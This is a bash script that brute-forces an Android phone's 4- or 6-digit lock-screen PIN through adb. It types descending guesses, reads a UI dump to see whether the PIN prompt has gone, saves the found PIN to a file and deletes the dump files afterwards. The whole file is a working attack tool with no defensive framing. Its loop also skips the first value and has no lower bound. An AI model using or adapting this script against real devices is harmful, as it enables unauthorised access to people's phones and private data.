#############################################
alias Button='./adbTouch.sh'
alias Text='adb shell input text '
alias ScreenOn='adb shell input keyevent 26'
alias Enter='adb shell input keyevent 66'
alias EnterPass='adb shell input keyevent 82'
#############################################
ScreenOn

EnterPass

echo "How much digits is on screen ?"
echo "  1) 4 digits"
echo "  2) 6 digits"
 
read n
case $n in
  1)
	echo selected 4 digits
	gen=9999
	EnterPass


if [ True ]
then
   while [ True ];
		do
		gen=$(($gen-1)) 
		echo trying $gen
		Text $gen
		Enter
                adb pull $(adb shell uiautomator dump | grep -oP '[^ ]+.xml') /tmp/view.xml >&-
		if cat /tmp/view.xml  |grep -q "Pin"
                then echo ""
                else 
                   echo UNLOCKED with $gen 
                   touch  $gen.is.pin
                   adb shell "rm /sdcard/window_dump.xml" & rm /tmp/view.xml >&-
                   break
                fi

done
fi

	;;
  2) 
	echo selected 6 digits
	gen=999999
	EnterPass

if [ True ]
then
   while [ True ];
                do
                gen=$(($gen-1)) 
		echo Trying $gen
                Text $gen
                Enter
		adb pull $(adb shell uiautomator dump | grep -oP '[^ ]+.xml') /tmp/view.xml >&-
		if cat /tmp/view.xml  |grep -q "Pin" 
                then echo ""
                else 
		   echo UNLOCKED with $gen 
		   touch  $gen.is.pin
		   adb shell "rm /sdcard/window_dump.xml" & rm /tmp/view.xml >&-
	  	   break
                fi
 

done
fi  




	;;
  *) echo "echo invalid option"
   ./main.sh
	;;
esac
